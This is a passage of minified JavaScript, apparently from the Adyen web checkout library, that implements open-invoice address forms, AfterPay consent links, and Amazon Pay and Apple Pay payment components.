n.includes(e.id)})):e;h(t||[]),y(1===t.length||g),m(!0)})).catch((function(e){h([]),m(!0)}))}),[]),A?Hl(mu,{label:c.get("country"),errorMessage:a,classNameModifiers:i},Lu("select",{onChange:o,name:"country",placeholder:c.get("select.country"),selected:s,items:p,readonly:g&&!!s})):null}function Vd(e){var t=Xc().i18n,n=e.classNameModifiers,r=void 0===n?[]:n,i=e.data,a=e.errors,o=e.fieldName,s=e.onInput,l=!!a[o],c=i[o],u=i.country,d=e.specifications.countryHasOptionalField(u,o),p=e.specifications.getKeyForField(o,u),h=d?" "+t.get("field.title.optional"):"",f=""+t.get(p)+h;switch(o){case"country":return Hl(Hd,{allowedCountries:e.allowedCountries,classNameModifiers:r,label:f,errorMessage:l,onDropdownChange:e.onDropdownChange,value:c});case"stateOrProvince":return Hl(zd,{classNameModifiers:r,label:f,errorMessage:l,onDropdownChange:e.onDropdownChange,selectedCountry:u,specifications:e.specifications,value:c});default:return Hl(mu,{label:f,classNameModifiers:r,errorMessage:l},Lu("text",{classNameModifiers:r,name:o,value:c,onInput:s}))}}var Qd=function(){function e(e){this.specifications=ml(ml({},ud),e)}return e.prototype.countryHasDataset=function(e){var t,n;return!!(null===(n=null===(t=this.specifications)||void 0===t?void 0:t[e])||void 0===n?void 0:n.hasDataset)},e.prototype.countryHasOptionalField=function(e,t){var n,r,i;return!!(null===(i=null===(r=null===(n=this.specifications)||void 0===n?void 0:n[e])||void 0===r?void 0:r.optionalFields)||void 0===i?void 0:i.includes(t))},e.prototype.getAddressSchemaForCountry=function(e){var t,n;return(null===(n=null===(t=this.specifications)||void 0===t?void 0:t[e])||void 0===n?void 0:n.schema)||this.specifications.default.schema},e.prototype.getOptionalFieldsForCountry=function(e){var t,n,r;return(null===(n=null===(t=this.specifications)||void 0===t?void 0:t[e])||void 0===n?void 0:n.optionalFields)||(null===(r=this.specifications.default)||void 0===r?void 0:r.optionalFields)||[]},e.prototype.getKeyForField=function(e,t){var n,r,i;return(null===(i=null===(r=null===(n=this.specifications)||void 0===n?void 0:n[t])||void 0===r?void 0:r.labels)||void 0===i?void 0:i[e])||e},e.prototype.getPlaceholderKeyForField=function(e,t){var n,r,i,a,o,s;return(null===(i=null===(r=null===(n=this.specifications)||void 0===n?void 0:n[t])||void 0===r?void 0:r.placeholders)||void 0===i?void 0:i[e])||(null===(s=null===(o=null===(a=this.specifications)||void 0===a?void 0:a.default)||void 0===o?void 0:o.placeholders)||void 0===s?void 0:s[e])},e}();function Gd(e){var t=e.label,n=void 0===t?"":t,r=e.requiredFields,i=e.visibility,a=Rc((function(){return new Qd(e.specifications)}),[e.specifications]),o=Hu({schema:r,defaultData:e.data,rules:e.validationRules||pd(a)}),s=o.data,l=o.errors,c=o.valid,u=o.isValid,d=o.handleChangeFor,p=o.triggerValidation;if(Oc((function(){var e=a.countryHasDataset(s.country)?"":nd,t=ml(ml({},s),{stateOrProvince:e});r.forEach((function(e){var n;d(e,"input")(null!==(n=t[e])&&void 0!==n?n:"")}))}),[s.country]),Oc((function(){var e=r.includes("stateOrProvince"),t=s.country&&a.countryHasDataset(s.country),n=e&&t,i=s.stateOrProvince||(n?"":nd);d("stateOrProvince","input")(i)}),[]),Oc((function(){var t=a.getOptionalFieldsForCountry(s.country),n=rd.reduce((function(n,i){var a=t.includes(i),o=r.includes(i),l=s[i],c=e.data[i],u=a&&!l||!o?o||l||!c?nd:c:l;return(null==u?void 0:u.length)&&(n[i]=u),n}),{});e.onChange({data:n,valid:c,errors:l,isValid:u})}),[s,c,l,u]),this.showValidation=p,"hidden"===i)return null;if("readOnly"===i)return Hl(dd,{data:s,label:n});var h=function(t,n){var i=n.classNameModifiers,o=void 0===i?[]:i;return r.includes(t)?Hl(Vd,{key:t,allowedCountries:e.allowedCountries,classNameModifiers:bl(bl([],o),[t]),data:s,errors:l,fieldName:t,onInput:d(t,"input"),onDropdownChange:d(t,"blur"),specifications:a}):null};return Hl(fu,{classNameModifiers:[n],label:n},a.getAddressSchemaForCountry(s.country).map((function(e){return e instanceof Array?Hl("div",{className:"adyen-checkout__field-group"},e.map((function(e){var t=e[0],n=e[1];return h(t,{classNameModifiers:["col-"+n]})}))):h(e,{})})))}function Wd(e){var t,n,r=e.errorMessage,i=e.label,a=e.onChange,o=vl(e,["errorMessage","label","onChange"]);return Hl(mu,{classNameModifiers:["consentCheckbox"],errorMessage:r},Hl(ku,{name:"consentCheckbox",classNameModifiers:bl(bl([],null!==(t=o.classNameModifiers)&&void 0!==t?t:o.classNameModifiers=[]),["consentCheckbox"]),onInput:a,value:null===(n=null==o?void 0:o.data)||void 0===n?void 0:n.consentCheckbox,label:i,checked:o.checked}))}Gd.defaultProps={countryCode:null,data:{},onChange:function(){},visibility:"editable",requiredFields:rd,specifications:{}};var Kd=["companyDetails","personalDetails","billingAddress","deliveryAddress"];function qd(e){var t,n,r=e.countryCode,i=e.visibility,a=Xc().i18n,o=Fc((t=i,void 0===(n=e.data)&&(n={}),Kd.reduce((function(e,r){var i,a="hidden"!==t[r],o="deliveryAddress"===r,s="hidden"===(null==t?void 0:t.billingAddress);return e[r]=a&&(!o||s||(void 0===(i=n[r])&&(i={}),1<Object.keys(i).length)),e}),{}))),s=o[0],l=o[1],c=Kd.reduce((function(e,t){return e[t]={current:null},e}),{}),u=!!e.consentCheckboxLabel,d=!u&&Object.keys(s).every((function(e){return!s[e]})),p="editable"===i.deliveryAddress&&"hidden"!==i.billingAddress,h=Fc(ml(ml({},e.data),u&&{consentCheckbox:!1})),f=h[0],A=h[1],m=Fc({}),v=m[0],g=m[1],y=Fc({}),b=y[0],_=y[1],w=Fc("ready"),C=w[0],x=w[1];this.setStatus=x,Oc((function(){var t,n,r=Object.keys(s).every((function(e){return!s[e]||!!b[e]})),i=!u||!!b.consentCheckbox,a=r&&i,o=(t=s,n=f,Object.keys(n).filter((function(e){return t[e]})).reduce((function(e,t){return e[t]=n[t],e}),{}));e.onChange({data:o,errors:v,valid:b,isValid:a})}),[f,s]);var S=function(e){return function(t){A((function(n){var r;return ml(ml({},n),((r={})[e]=t.data,r))})),_((function(n){var r;return ml(ml({},n),((r={})[e]=t.isValid,r))})),g((function(n){var r;return ml(ml({},n),((r={})[e]=t.errors,r))}))}};return this.showValidation=function(){Kd.forEach((function(e){c[e].current&&c[e].current.showValidation()})),g(ml({},u&&{consentCheckbox:!f.consentCheckbox}))},Hl("div",{className:"adyen-checkout__open-invoice"},s.companyDetails&&Hl(Vu,{data:e.data.companyDetails,label:"companyDetails",onChange:S("companyDetails"),ref:c.companyDetails,visibility:i.companyDetails}),s.personalDetails&&Hl(td,{data:e.data.personalDetails,requiredFields:e.personalDetailsRequiredFields,label:"personalDetails",onChange:S("personalDetails"),ref:c.personalDetails,visibility:i.personalDetails}),s.billingAddress&&Hl(Gd,{allowedCountries:e.allowedCountries,countryCode:r,data:f.billingAddress,label:"billingAddress",onChange:S("billingAddress"),ref:c.billingAddress,visibility:i.billingAddress}),p&&Hl(ku,{label:a.get("separateDeliveryAddress"),checked:s.deliveryAddress,classNameModifiers:["separateDeliveryAddress"],name:"separateDeliveryAddress",onChange:function(){l((function(e){return ml(ml({},e),{deliveryAddress:!s.deliveryAddress})}))}}),s.deliveryAddress&&Hl(Gd,{allowedCountries:e.allowedCountries,countryCode:r,data:f.deliveryAddress,label:"deliveryAddress",onChange:S("deliveryAddress"),ref:c.deliveryAddress,visibility:i.deliveryAddress}),u&&Hl(Wd,{data:f,errorMessage:!!v.consentCheckbox,label:e.consentCheckboxLabel,onChange:function(e){var t=e.target.checked;A((function(e){return ml(ml({},e),{consentCheckbox:t})})),_((function(e){return ml(ml({},e),{consentCheckbox:t})})),g((function(e){return ml(ml({},e),{consentCheckbox:!t})}))}}),e.showPayButton&&e.payButton({status:C,classNameModifiers:bl([],d?["standalone"]:[]),label:a.get("confirmPurchase")}))}var Xd=function(e){function t(){var t=null!==e&&e.apply(this,arguments)||this;return t.state={loaded:!1},t}return Al(t,e),t.prototype.componentDidMount=function(){var e=this;this.props.i18n?this.props.i18n.loaded.then((function(){e.setState({loaded:!0})})):this.setState({loaded:!0})},t.prototype.render=function(e){var t=e.children;return this.state.loaded?Hl(qc.Provider,{value:{i18n:this.props.i18n,loadingContext:this.props.loadingContext}},Zl(t)):null},t}(Gl),Yd=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.isValid},enumerable:!1,configurable:!0}),t.prototype.formatProps=function(e){var n,r,i=e.countryCode||(null===(r=null===(n=e.data)||void 0===n?void 0:n.billingAddress)||void 0===r?void 0:r.countryCode);return ml(ml({},e),{allowedCountries:[i],visibility:ml(ml({},t.defaultProps.visibility),e.visibility),data:ml(ml({},e.data),{billingAddress:ml(ml({},e.data.billingAddress),{country:i}),deliveryAddress:ml(ml({},e.data.deliveryAddress),{country:i})})})},t.prototype.formatData=function(){var e=this.state.data,t=void 0===e?{}:e,n=t.companyDetails,r=void 0===n?{}:n,i=t.personalDetails,a=void 0===i?{}:i,o=t.billingAddress,s=t.deliveryAddress;return ml(ml(ml(ml({paymentMethod:{type:this.constructor.type}},a),r),o&&{billingAddress:o}),(s||o)&&{deliveryAddress:s||o})},t.prototype.render=function(){var e=this;return Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(qd,ml({ref:function(t){e.componentRef=t}},this.props,this.state,{consentCheckbox:this.props.consentCheckbox,onChange:this.setState,onSubmit:this.submit,payButton:this.payButton})))},t.defaultProps={onChange:function(){},data:{companyDetails:{},personalDetails:{},billingAddress:{},deliveryAddress:{}},visibility:{companyDetails:"hidden",personalDetails:"editable",billingAddress:"editable",deliveryAddress:"editable"}},t}(Zc);function Jd(e){var t=Xc().i18n,n=t.get("paymentConditions"),r=t.get("afterPay.agreement").split("%@"),i=r[0],a=r[1];return i&&a?Hl(Ql,null,i,Hl("a",{className:"adyen-checkout__link",target:"_blank",rel:"noopener noreferrer",href:e.url},n),a):Hl("span",{className:"adyen-checkout__checkbox__label"},t.get("privacyPolicy"))}var Zd=["BE","NL"],ep=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){var n,r,i;return ml(ml({},e.prototype.formatProps.call(this,t)),{allowedCountries:t.countryCode?[t.countryCode]:Zd,consentCheckboxLabel:Hl(Jd,{url:(r=t.countryCode,i=null===(n=t.i18n)||void 0===n?void 0:n.locale,"en"===(null==i?void 0:i.toLowerCase().slice(0,2))?"https://www.afterpay.nl/en/algemeen/pay-with-afterpay/payment-conditions":"be"===(null==r?void 0:r.toLowerCase())?"https://www.afterpay.be/be/footer/betalen-met-afterpay/betalingsvoorwaarden":"https://www.afterpay.nl/nl/algemeen/betalen-met-afterpay/betalingsvoorwaarden")})})},t.type="afterpay_default",t}(Yd),tp=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){return ml(ml({},e.prototype.formatProps.call(this,t)),{allowedCountries:t.countryCode?[t.countryCode]:Zd,consentCheckboxLabel:Hl(Jd,{url:"https://www.afterpay.nl/nl/algemeen/zakelijke-partners/betalingsvoorwaarden-zakelijk"})})},t.type="afterpay_b2b",t.defaultProps={onChange:function(){},data:{companyDetails:{},personalDetails:{},billingAddress:{},deliveryAddress:{}},visibility:{companyDetails:"editable",personalDetails:"editable",billingAddress:"editable",deliveryAddress:"editable"}},t}(Yd);function np(){var e=dc(window,"screen.colorDepth")||"",t=!!dc(window,"navigator.javaEnabled")&&window.navigator.javaEnabled(),n=dc(window,"screen.height")||"",r=dc(window,"screen.width")||"",i=dc(window,"navigator.userAgent")||"";return{acceptHeader:"*/*",colorDepth:e,language:dc(window,"navigator.language")||dc(window,"navigator.browserLanguage"),javaEnabled:t,screenHeight:n,screenWidth:r,userAgent:i,timeZoneOffset:(new Date).getTimezoneOffset()}}var rp=["en_GB","de_DE","fr_FR","it_IT","es_ES"],ip=["en_US"];function ap(e,t,n){return Ud({loadingContext:e,path:"v1/AmazonPayUtility/getCheckoutDetails?clientKey="+t},n)}function op(e){var t,n,r,i,a,o,s,l,c,u,d,p,h,f,A,m,v,g=this,y=Xc().loadingContext,b=e.amazonRef,_=e.configuration,w=void 0===_?{}:_,C=Fc(null),x=C[0],S=C[1],k=(l=(o=e).amount,c=o.addressDetails,u=o.cancelUrl,d=o.checkoutMode,p=o.deliverySpecifications,h=o.returnUrl,f=o.merchantMetadata,A=o.configuration.storeId,v=(m="ProcessOrder"===d)?(s=l,{amount:String(Nl(s.value,s.currency)),currencyCode:s.currency}):null,ml(ml(ml(ml({storeId:A,webCheckoutDetails:ml(ml(ml({},m?{checkoutResultReturnUrl:h}:{checkoutReviewReturnUrl:h}),u&&{checkoutCancelUrl:u}),m&&{checkoutMode:d})},m&&{paymentDetails:{chargeAmount:v,paymentIntent:"Confirm"}}),f&&{merchantMetadata:f}),p&&{deliverySpecifications:p}),c&&{addressDetails:c})),M=ml(ml(ml({},(t=e).buttonColor&&{buttonColor:t.buttonColor}),t.design&&{design:(a=t.design,"noTagline"===a?"C0001":null)}),{checkoutLanguage:(r=t.locale,i=t.region,("US"===i?ip:rp).includes(r)?r:"US"===i?"en_US":"en_GB"),ledgerCurrency:t.currency||(null===(n=t.amount)||void 0===n?void 0:n.currency),merchantId:t.configuration.merchantId,productType:t.productType,placement:t.placement,sandbox:"TEST"===t.environment}),B=function(){new Promise(e.onClick).then(g.initCheckout).catch((function(t){e.onError(t,g.componentRef)}))};return this.initCheckout=function(){var e={payloadJSON:JSON.stringify(k),publicKeyId:w.publicKeyId,signature:x};b.Pay.initCheckout(ml(ml({},M),{createCheckoutSessionConfig:e}))},Oc((function(){var t,n,r,i=e.clientKey;(t=k,n={loadingContext:y,path:"v1/AmazonPayUtility/signString?clientKey="+i},r={stringToSign:JSON.stringify(t)},Ud(n,r)).then((function(t){(null==t?void 0:t.signature)&&(S(t.signature),e.showPayButton&&b.Pay.renderButton("#amazonPayButton",M).onClick(B))})).catch((function(t){e.onError&&e.onError(t,g.componentRef)}))}),[]),e.showPayButton?Hl("div",{className:"adyen-checkout__amazonpay__button",id:"amazonPayButton"}):null}function sp(e){var t=Xc().i18n,n=e.amazonRef,r=e.amazonCheckoutSessionId;return Oc((function(){var e={amazonCheckoutSessionId:r,changeAction:"changeAddress"};n.Pay.bindChangeAction(".adyen-checkout__amazonpay__button--changeAddress",e)}),[]),Hl("button",{type:"button",className:"adyen-checkout__button adyen-checkout__button--ghost adyen-checkout__amazonpay__button--changeAddress"},t.get("amazonpay.changePaymentDetails"))}function lp(e){var t=this,n=Xc(),r=n.i18n,i=n.loadingContext;return this.createOrder=function(){var n=e.amazonCheckoutSessionId,r=e.amount,a=e.clientKey,o=e.publicKeyId,s=e.returnUrl;Ud({loadingContext:i,path:"v1/AmazonPayUtility/updateCheckoutSession?clientKey="+a},{amount:r,checkoutResultReturnUrl:s,checkoutSessionId:n,publicKeyId:o}).then((function(e){var t;(null===(t=null==e?void 0:e.action)||void 0===t?void 0:t.type)&&"redirect"===e.action.type&&window.location.assign(e.action.url)})).catch((function(n){e.onError&&e.onError(n,t.componentRef)}))},Hl(Yc,{classNameModifiers:["standalone","pay"],label:r.get("confirmPurchase"),onClick:this.createOrder})}function cp(e){return Hl("button",{type:"button",className:"adyen-checkout__button  adyen-checkout__button--ghost adyen-checkout__amazonpay__button--signOut",onClick:function(){new Promise(e.onSignOut).then((function(){e.amazonRef.Pay.signout()})).catch(console.error)}},Xc().i18n.get("amazonpay.signout"))}var up=function(e,t){var n=this;void 0===t&&(t="body"),this.load=function(){return new Promise((function(e,t){n.script.src=n.src,n.script.async=!0,n.script.onload=e,n.script.onerror=function(){n.remove(),t(new Error("Unable to load script "+n.src))};var r=document.querySelector(n.node),i=r.querySelector('script[src="'+n.src+'"]');i?i.addEventListener("load",e):r.appendChild(n.script)}))},this.remove=function(){return n.script.remove()},this.script=document.createElement("script"),this.src=e,this.node=t};function dp(e){var t,n=Fc("pending"),r=n[0],i=n[1],a=Dc(null),o=Dc(null),s=function(){i("ready")};return this.submit=function(){return a.current&&a.current.initCheckout?a.current.initCheckout():o.current&&o.current.createOrder?o.current.createOrder():void 0},Oc((function(){var t="US"===e.region?"https://static-na.payments-amazon.com/checkout.js":"https://static-eu.payments-amazon.com/checkout.js",n=new up(t);return window.amazon?s():n.load().then(s),function(){n.remove()}}),[]),"pending"===r?Hl("div",{className:"adyen-checkout__amazonpay"},Hl("div",{className:"adyen-checkout__amazonpay__status adyen-checkout__amazonpay__status--pending"},Hl(xc,null))):e.showSignOutButton?Hl("div",{className:"adyen-checkout__amazonpay"},Hl(cp,{amazonRef:window.amazon,onSignOut:e.onSignOut})):e.amazonCheckoutSessionId?Hl("div",{className:"adyen-checkout__amazonpay"},e.showOrderButton&&Hl(lp,{amazonCheckoutSessionId:e.amazonCheckoutSessionId,amount:e.amount,clientKey:e.clientKey,onError:e.onError,publicKeyId:null===(t=e.configuration)||void 0===t?void 0:t.publicKeyId,returnUrl:e.returnUrl,ref:o}),e.showChangePaymentDetailsButton&&Hl(sp,{amazonCheckoutSessionId:e.amazonCheckoutSessionId,amazonRef:window.amazon})):Hl("div",{className:"adyen-checkout__amazonpay"},Hl(op,ml({},e,{amazonRef:window.amazon,ref:a})))}var pp={cancelUrl:window.location.href,configuration:{},environment:"TEST",locale:"en_GB",placement:"Cart",productType:"PayAndShip",region:"EU",returnUrl:window.location.href,showOrderButton:!0,showChangePaymentDetailsButton:!1,showSignOutButton:!1,showPayButton:!0,onClick:function(e){return e()},onSignOut:function(e){return e()}},hp=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(e){return ml(ml({},e),{checkoutMode:e.isDropin?"ProcessOrder":e.checkoutMode,environment:e.environment.toUpperCase(),locale:e.locale.replace("-","_"),productType:e.isDropin&&!e.addressDetails?"PayOnly":e.productType,region:e.region.toUpperCase()})},t.prototype.formatData=function(){var e=this.props.amazonCheckoutSessionId;return{paymentMethod:ml({type:t.type},e&&{checkoutSessionId:e}),browserInfo:this.browserInfo}},t.prototype.getShopperDetails=function(){var e=this.props,t=e.amazonCheckoutSessionId,n=e.configuration,r=void 0===n?{}:n,i=e.loadingContext,a=e.clientKey;return t?ap(i,a,{checkoutSessionId:t,getDeliveryAddress:!0,publicKeyId:r.publicKeyId}):void 0},t.prototype.handleDeclineFlow=function(){var e=this,t=this.props,n=t.amazonCheckoutSessionId,r=t.configuration,i=void 0===r?{}:r,a=t.loadingContext,o=t.clientKey;n&&ap(a,o,{checkoutSessionId:n,getDeclineFlowUrl:!0,publicKeyId:i.publicKeyId}).then((function(e){if(void 0===e&&(e={}),!(null==e?void 0:e.declineFlowUrl))throw e;window.location.assign(e.declineFlowUrl)})).catch((function(t){e.props.onError&&e.props.onError(t,e.componentRef)}))},Object.defineProperty(t.prototype,"isValid",{get:function(){return!0},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"browserInfo",{get:function(){return np()},enumerable:!1,configurable:!0}),t.prototype.submit=function(){var e=this.data,t=this.isValid,n=this.props.onSubmit,r=void 0===n?function(){}:n;return this.componentRef&&this.componentRef.submit?this.componentRef.submit():r({data:e,isValid:t},this)},t.prototype.render=function(){var e=this;return Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(dp,ml({ref:function(t){e.componentRef=t}},this.props)))},t.type="amazonpay",t.defaultProps=pp,t}(Zc),fp={"apple-pay-button":"ApplePayButton-module_apple-pay-button__26P3-","apple-pay-button-black":"ApplePayButton-module_apple-pay-button-black__3Ml54","apple-pay-button-white":"ApplePayButton-module_apple-pay-button-white__1qE8A","apple-pay-button-white-with-line":"ApplePayButton-module_apple-pay-button-white-with-line__j9FE5","apple-pay-button--type-plain":"ApplePayButton-module_apple-pay-button--type-plain__2mnnX","apple-pay-button--type-buy":"ApplePayButton-module_apple-pay-button--type-buy__eMnIy","apple-pay-button--type-donate":"ApplePayButton-module_apple-pay-button--type-donate__3zvI8","apple-pay-button--type-check-out":"ApplePayButton-module_apple-pay-button--type-check-out__ipg0J","apple-pay-button--type-book":"ApplePayButton-module_apple-pay-button--type-book__155Xs","apple-pay-button--type-subscribe":"ApplePayButton-module_apple-pay-button--type-subscribe__3uPJ5","apple-pay-button--type-add-money":"ApplePayButton-module_apple-pay-button--type-add-money__xmCaj","apple-pay-button--type-contribute":"ApplePayButton-module_apple-pay-button--type-contribute__RCq2P","apple-pay-button--type-order":"ApplePayButton-module_apple-pay-button--type-order__f5tpZ","apple-pay-button--type-reload":"ApplePayButton-module_apple-pay-button--type-reload__1P53C","apple-pay-button--type-rent":"ApplePayButton-module_apple-pay-button--type-rent__2J4wk","apple-pay-button--type-support":"ApplePayButton-module_apple-pay-button--type-support__3-p0R","apple-pay-button--type-tip":"ApplePayButton-module_apple-pay-button--type-tip__2-gCt","apple-pay-button--type-top-up":"ApplePayButton-module_apple-pay-button--type-top-up__9UKXI"},Ap=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.render=function(e){var t=e.buttonColor,n=e.buttonType;return Hl("button",{type:"button","aria-label":this.props.i18n.get("payButton"),lang:this.props.i18n.languageCode,className:Cc("adyen-checkout__applepay__button","adyen-checkout__applepay__button--"+t,"adyen-checkout__applepay__button--"+n,[fp["apple-pay-button"]],[fp["apple-pay-button-"+t]],[fp["apple-pay-button--type-"+n]]),onClick:this.props.onClick})},t.defaultProps={onClick:function(){},buttonColor:"black",buttonType:"plain"},t}(Gl),mp=function(){function e(e,t){var n=this;this.session=new ApplePaySession(t.version,e),this.session.onvalidatemerchant=function(e){return n.onvalidatemerchant(e,t.onValidateMerchant)},this.session.onpaymentauthorized=function(e){return n.onpaymentauthorized(e,t.onPaymentAuthorized)},this.session.oncancel=function(e){return n.oncancel(e,t.onCancel)},"function"==typeof t.onPaymentMethodSelected&&(this.session.onpaymentmethodselected=function(e){return n.onpaymentmethodselected(e,t.onPaymentMethodSelected)}),"function"==typeof t.onShippingContactSelected&&(this.session.onshippingcontactselected=function(e){return n.onshippingcontactselected(e,t.onShippingContactSelected)}),"function"==typeof t.onShippingMethodSelected&&(this.session.onshippingmethodselected=function(e){return n.onshippingmethodselected(e,t.onShippingMethodSelected)})}return e.prototype.begin=function(){return this.session.begin()},e.prototype.onvalidatemerchant=function(e,t){var n=this;new Promise((function(n,r){return t(n,r,e.validationURL)})).then((function(e){n.session.completeMerchantValidation(e)})).catch((function(e){n.session.abort()}))},e.prototype.onpaymentauthorized=function(e,t){var n=this;return new Promise((function(n,r){return t(n,r,e)})).then((function(){n.session.completePayment(ApplePaySession.STATUS_SUCCESS)})).catch((function(){n.session.completePayment(ApplePaySession.STATUS_FAILURE)}))},e.prototype.onpaymentmethodselected=function(e,t){var n=this;return new Promise((function(n,r){return t(n,r,e)})).then((function(e){n.session.completePaymentMethodSelection(e)})).catch((function(e){n.session.completePaymentMethodSelection(e)}))},e.prototype.onshippingcontactselected=function(e,t){var n=this;return new Promise((function(n,r){return t(n,r,e)})).then((function(e){n.session.completeShippingContactSelection(e)})).catch((function(e){n.session.completeShippingContactSelection(e)}))},e.prototype.onshippingmethodselected=function(e,t){var n=this;return new Promise((function(n,r){return t(n,r,e)})).then((function(e){n.session.completeShippingMethodSelection(e)})).catch((function(e){n.session.completeShippingMethodSelection(e)}))},e.prototype.oncancel=function(e,t){return t(e)},e}(),vp={amount:{currency:"USD",value:0},countryCode:"US",totalPriceStatus:"final",totalPriceLabel:void 0,configuration:{merchantName:"",merchantId:""},initiative:"web",lineItems:void 0,merchantCapabilities:["supports3DS"],shippingMethods:void 0,shippingType:void 0,supportedCountries:void 0,supportedNetworks:["amex","discover","masterCard","visa"],requiredBillingContactFields:void 0,requiredShippingContactFields:void 0,billingContact:void 0,shippingContact:void 0,applicationData:void 0,onClick:function(e){return e()},onSubmit:function(){},onError:function(){},onAuthorized:function(e){return e()},onPaymentMethodSelected:null,onShippingContactSelected:null,onShippingMethodSelected:null,buttonType:"plain",buttonColor:"black",showPayButton:!0},gp=function(e){function t(t){var n=e.call(this,t)||this;return n.startSession=n.startSession.bind(n),n.submit=n.submit.bind(n),n.validateMerchant=n.validateMerchant.bind(n),n}return Al(t,e),t.prototype.formatProps=function(e){var t,n,r,i,a=e.version||function(e){for(var t=[],n=11;0<n;n--)t.push(n);return t.find((function(e){return e&&window.ApplePaySession&&ApplePaySession.supportsVersion(e)}))}(),o=(null===(t=e.brands)||void 0===t?void 0:t.length)?(r=e.brands,i={mc:"masterCard",amex:"amex",visa:"visa",elodebit:"elo",elo:"elo",interac:"interac",discover:"discover",jcb:"jcb",electron:"electron",maestro:"maestro",girocard:"girocard",cartebancaire:"cartesBancaires"},r.reduce((function(e,t){return i[t]&&!e.includes(i[t])&&e.push(i[t]),e}),[])):e.supportedNetworks;return ml(ml({},e),{configuration:e.configuration,supportedNetworks:o,version:a,totalPriceLabel:e.totalPriceLabel||(null===(n=e.configuration)||void 0===n?void 0:n.merchantName),onCancel:function(t){return e.onError(t)}})},t.prototype.formatData=function(){return{paymentMethod:ml({type:t.type},this.state)}},t.prototype.submit=function(){var e=this;this.startSession((function(t,n,r){e.props.onSubmit&&e.props.onSubmit({data:e.data,isValid:e.isValid},e.elementRef),e.props.onAuthorized(t,n,r)}))},t.prototype.startPayment=function(){var e=this;return new Promise((function(t){e.startSession((function(n,r,i){return e.props.onAuthorized(n,r,i),t(!0)}))}))},t.prototype.startSession=function(e){var t=this,n=this.props,r=n.version,i=n.onValidateMerchant,a=n.onCancel,o=n.onPaymentMethodSelected,s=n.onShippingMethodSelected,l=n.onShippingContactSelected;return new Promise((function(e,n){return t.props.onClick(e,n)})).then((function(){var n=function(e){var t=e.countryCode;e.companyName;var n,r=e.amount,i=vl(e,["countryCode","companyName","amount"]),a=(n=r,String(Nl(n.value,n.currency)));return{countryCode:t,currencyCode:r.currency,total:{label:i.totalPriceLabel,amount:a,type:i.totalPriceStatus},lineItems:i.lineItems,shippingMethods:i.shippingMethods,shippingType:i.shippingType,merchantCapabilities:i.merchantCapabilities,supportedCountries:i.supportedCountries,supportedNetworks:i.supportedNetworks,requiredShippingContactFields:i.requiredShippingContactFields,requiredBillingContactFields:i.requiredBillingContactFields,billingContact:i.billingContact,shippingContact:i.shippingContact,applicationData:i.applicationData}}(ml({companyName:t.props.configuration.merchantName},t.props));new mp(n,{version:r,onCancel:a,onPaymentMethodSelected:o,onShippingMethodSelected:s,onShippingContactSelected:l,onValidateMerchant:i||t.validateMerchant,onPaymentAuthorized:function(n,r,i){i.payment.token&&i.payment.token.paymentData&&t.setState({applePayToken:btoa(JSON.stringify(i.payment.token.paymentData))}),e(n,r,i)}}).begin()}))},t.prototype.validateMerchant=function(e,t){return gl(this,void 0,void 0,(function(){var n,r,i,a,o,s,l,c,u,d,p,h,f;return yl(this,(function(A){switch(A.label){case 0:n=window.location.hostname,r=this.props,i=r.clientKey,a=r.configuration,o=r.loadingContext,s=r.initiative,l=a.merchantName,c=a.merchantId,u={loadingContext:o,path:"v1/applePay/sessions?clientKey="+i},d={displayName:l,domainName:n,initiative:s,merchantIdentifier:c},A.label=1;case 1:return A.trys.push([1,3,,4]),[4,Ud(u,d)];case 2:return p=A.sent(),(h=pu.decode(p.data))||t("Could not decode Apple Pay session"),f=JSON.parse(h),e(f),[3,4];case 3:return A.sent(),t("Could not get Apple Pay session"),[3,4];case 4:return[2]}}))}))},Object.defineProperty(t.prototype,"isValid",{get:function(){return!0},enumerable:!1,configurable:!0}),t.prototype.isAvailable=function(){return"https:"!==document.location.protocol?Promise.reject(new Error("Trying to start an Apple Pay session from an insecure document")):this.props.onValidateMerchant||this.props.clientKey?window.ApplePaySession&&ApplePaySession.canMakePayments()&&ApplePaySession.supportsVersion(this.props.version)?Promise.resolve(ApplePaySession.canMakePayments()):Promise.reject(new Error("Apple Pay is not available on this device")):Promise.reject(new Error("clientKey was not provided"))},t.prototype.render=function(){var e=this;return this.props.showPayButton?Hl(Ap,{i18n:this.props.i18n,buttonColor:this.props.buttonColor,buttonType:this.props.buttonType,onClick:function(t){t.preventDefault(),e.submit()}}):null},t.type="applepay",t.defaultProps=vp,t}(Zc),yp=["issuer"],bp={issuer:{validate:function(e){return!!e&&0<e.length},modes:["blur"]}};function _p(e){var t,n,r,i,a,o=e.items,s=e.placeholder,l=e.issuer,c=vl(e,["items","placeholder","issuer"]),u=Xc().i18n,d=Hu({schema:yp,defaultData:{issuer:l},rules:bp}),p=d.handleChangeFor,h=d.triggerValidation,f=d.data,A=d.valid,m=d.errors,v=d.isValid,g=Fc("ready"),y=g[0],b=g[1];return this.setStatus=function(e){b(e)},Oc((function(){c.onChange({data:f,valid:A,errors:m,isValid:v})}),[f,A,m,v]),this.showValidation=function(){h()},Hl("div",{className:"adyen-checkout__issuer-list"},Hl(mu,{errorMessage:!!m.issuer,classNameModifiers:["issuer-list"]},Lu("select",{items:o,selected:f.issuer,placeholder:u.get(s),name:"issuer",className:"adyen-checkout__issuer-list__dropdown",onChange:p("issuer")})),c.showPayButton&&c.payButton({status:y,label:(t={issuer:f.issuer,items:o},n=u,i=t.issuer,a=null===(r=t.items.find((function(e){return e.id===i})))||void 0===r?void 0:r.name,i&&a?n.get("continueTo")+" "+a:n.get("continue"))}))}_p.defaultProps={onChange:function(){},placeholder:"idealIssuer.selectField.placeholder"};var wp,Cp=function(e,t){return function(n){if(!n)return null;var r=ml({parentFolder:n?t+"/":"",type:n||t},e);return gc(r)(n)}},xp=function(e){function t(t){var n=e.call(this,t)||this;if(n.props.showImage){var 